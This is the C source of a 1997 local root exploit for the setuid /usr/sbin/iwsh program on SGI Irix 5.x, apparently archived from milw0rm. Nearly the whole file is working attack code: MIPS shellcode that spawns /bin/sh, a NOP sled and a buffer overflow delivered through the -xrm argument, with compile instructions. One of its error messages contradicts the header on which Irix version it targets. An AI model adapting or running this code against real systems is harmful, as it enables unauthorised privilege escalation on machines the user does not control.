/* /usr/sbin/iwsh.c exploit by DCRH 27/5/97
 *
 * Tested on: R3000 Indigo (Irix 5.3)
 *            R4400 Indy   (Irix 5.3)
 *
 * Irix 5.x only
 *
 * compile as: cc iwsh.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define NUM_ADDRESSES   500
#define BUF_LENGTH      500
#define EXTRA           9000
#define OFFSET          0x180
#define GP_OFFSET       -0x80
#define IRIX_NOP        0x03e0f825    /* move $ra,$ra */

#define u_long unsigned


u_long get_sp_code[] = {
    0x03a01025,         /* move $v0,$sp         */
    0x03e00008,         /* jr $ra               */
    0x00000000,         /* nop                  */
};

u_long irix_shellcode[] = {
    0x24041234,         /* li $4,0x1234         */
    0x2084edcc,         /* sub $4,0x1234        */
    0x0491fffe,         /* bgezal $4,pc-4       */
    0x03bd302a,         /* sgt $6,$sp,$sp       */
    0x03bd202a,         /* sgt $4,$sp,$sp       */
    0x240203ff,         /* li $v0,1023          */
    0x03ffffcc,         /* syscall 0xfffff      */
    0x23e40138,         /* addi $4,$31,264+48   */
    0xa086feff,         /* sb $6,-264+7($4)     */
    0x2084fef8,         /* sub $4,264           */
    0x20850110,         /* addi $5,$4,264+8     */
    0xaca4fef8,         /* sw $4,-264($5)       */
    0xaca6fefc,         /* sw $4,-260($5)       */
    0x20a5fef8,         /* sub $5, 264          */
    0x240203f3,         /* li $v0,1011          */
    0x03ffffcc,         /* syscall 0xfffff      */
    0x2f62696e,         /* "/bin"               */
    0x2f7368ff,         /* "/sh"                */
};

char buf[NUM_ADDRESSES+BUF_LENGTH + EXTRA + 8];

void main(int argc, char **argv)
{
    char *env[] = {NULL};
    u_long targ_addr, stack, tmp;
    u_long *long_p;
    int i, code_length = strlen((char *)irix_shellcode)+1;
    u_long (*get_sp)(void) = (u_long (*)(void))get_sp_code;

    stack = get_sp();

    if (stack & 0x80000000) {
        printf("Recompile with the '-32' option\n");
        exit(1);
    }

    long_p =(u_long *)  buf;
    targ_addr = stack + OFFSET;

    if (argc > 1)
        targ_addr += atoi(argv[1]) * 4;

    if (targ_addr + GP_OFFSET > 0x80000000) {
        printf("Sorry - this exploit for Irix 6.x only\n");
        exit(1);
    }

    tmp = (targ_addr + NUM_ADDRESSES + (BUF_LENGTH-code_length)/2) & ~3;

    while ((tmp & 0xff000000) == 0 ||
           (tmp & 0x00ff0000) == 0 ||
           (tmp & 0x0000ff00) == 0 ||
           (tmp & 0x000000ff) == 0)
        tmp += 4;

    for (i = 0; i < NUM_ADDRESSES/(4*sizeof(u_long)); i++) {
        *long_p++ = targ_addr;
        *long_p++ = targ_addr;
        *long_p++ = tmp;
        *long_p++ = tmp;
    }

    for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
        *long_p++ = IRIX_NOP;

    for (i = 0; i < code_length/sizeof(u_long); i++)
        *long_p++ = irix_shellcode[i];

    tmp = (targ_addr + GP_OFFSET + NUM_ADDRESSES/2) & ~3;

    for (i = 0; i < EXTRA / sizeof(u_long); i++)
        *long_p++ = (tmp >> 8) | (tmp << 24);

    *long_p = 0;

    printf("stack = 0x%x, targ_addr = 0x%x\n", stack, targ_addr);

    execle("/usr/sbin/iwsh", "iwsh", "-xrm", &buf[2], 0, env);
    perror("execl failed");
}


// milw0rm.com [1997-05-27]